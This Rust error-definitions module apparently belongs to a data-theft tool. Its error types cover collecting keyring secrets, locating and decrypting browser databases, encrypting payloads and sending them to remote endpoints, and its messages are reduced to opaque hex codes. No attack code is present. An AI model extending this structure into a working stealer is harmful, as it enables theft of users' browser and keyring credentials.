use crate::errlog;

/// Implements code(), record(), Debug, Display, and Error for an error enum.
/// Debug and Display both emit the hex error code as "E{:02x}".
macro_rules! impl_error {
    ($ty:ty, { $($variant:pat => $code:expr),+ $(,)? }) => {
        impl $ty {
            fn code(&self) -> u8 {
                match self { $($variant => $code),+ }
            }

            pub fn record(&self) {
                errlog::record(self.code());
            }
        }

        impl std::fmt::Debug for $ty {
            fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                write!(f, "E{:02x}", self.code())
            }
        }

        impl std::fmt::Display for $ty {
            fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                write!(f, "E{:02x}", self.code())
            }
        }

        impl std::error::Error for $ty {}
    };
}

// --- Crypto Errors ---

pub enum CryptoError {
    InvalidPublicKey(String),
    EncryptionFailed(String),
    DecryptionFailed(String),
    CiphertextTooShort(usize),
    KeyDerivation(String),
}

impl_error!(CryptoError, {
    CryptoError::InvalidPublicKey(_) => errlog::codes::INVALID_PUBKEY,
    CryptoError::EncryptionFailed(_) => errlog::codes::ENCRYPT_FAIL,
    CryptoError::DecryptionFailed(_) => errlog::codes::DECRYPT_FAIL,
    CryptoError::CiphertextTooShort(_) => errlog::codes::SHORT_CIPHERTEXT,
    CryptoError::KeyDerivation(_) => errlog::codes::KEY_DERIVATION,
});

// --- Proto Errors ---

pub enum ProtoError {
    Serialize(serde_json::Error),
    InvalidEnvelope(String),
}

impl_error!(ProtoError, {
    ProtoError::Serialize(_) => errlog::codes::SERIALIZE_FAIL,
    ProtoError::InvalidEnvelope(_) => errlog::codes::INVALID_ENVELOPE,
});

impl From<serde_json::Error> for ProtoError {
    fn from(e: serde_json::Error) -> Self {
        ProtoError::Serialize(e)
    }
}

// --- Channel Errors ---

pub enum ChannelError {
    SendFailed(String),
    NoEndpoints,
    AllEndpointsFailed,
    ResponseError(String),
}

impl_error!(ChannelError, {
    ChannelError::SendFailed(_) => errlog::codes::SEND_FAIL,
    ChannelError::NoEndpoints => errlog::codes::NO_ENDPOINTS,
    ChannelError::AllEndpointsFailed => errlog::codes::CONNECT_FAIL,
    ChannelError::ResponseError(_) => errlog::codes::SEND_FAIL,
});

// --- Config Errors ---

pub enum ConfigError {
    FileRead(std::io::Error),
    Parse(serde_json::Error),
    InvalidServerKey(String),
}

impl_error!(ConfigError, {
    ConfigError::FileRead(_) => errlog::codes::CONFIG_READ,
    ConfigError::Parse(_) => errlog::codes::CONFIG_PARSE,
    ConfigError::InvalidServerKey(_) => errlog::codes::CONFIG_KEY,
});

impl From<std::io::Error> for ConfigError {
    fn from(e: std::io::Error) -> Self {
        ConfigError::FileRead(e)
    }
}

impl From<serde_json::Error> for ConfigError {
    fn from(e: serde_json::Error) -> Self {
        ConfigError::Parse(e)
    }
}

// --- Collect Errors ---

pub enum CollectError {
    Failed,
    NotAvailable,
    NoKeyring,
    KeyringGetFailed,
}

impl_error!(CollectError, {
    CollectError::Failed => errlog::codes::COLLECT_FAILED,
    CollectError::NotAvailable => errlog::codes::COLLECT_NOT_AVAIL,
    CollectError::NoKeyring => errlog::codes::COLLECT_NO_KEYRING,
    CollectError::KeyringGetFailed => errlog::codes::COLLECT_KEYRING_FAILED,
});

// --- Browser Errors ---

pub enum BrowserError {
    DatabaseNotFound,
    QueryFailed,
    KeyRetrieval,
    DecryptFailed,
    ParseFailed,
}

impl_error!(BrowserError, {
    BrowserError::DatabaseNotFound => errlog::codes::BROWSER_DB_NOT_FOUND,
    BrowserError::QueryFailed => errlog::codes::BROWSER_QUERY_FAIL,
    BrowserError::KeyRetrieval => errlog::codes::BROWSER_KEY_RETRIEVAL,
    BrowserError::DecryptFailed => errlog::codes::BROWSER_DECRYPT_FAIL,
    BrowserError::ParseFailed => errlog::codes::BROWSER_PARSE_FAIL,
});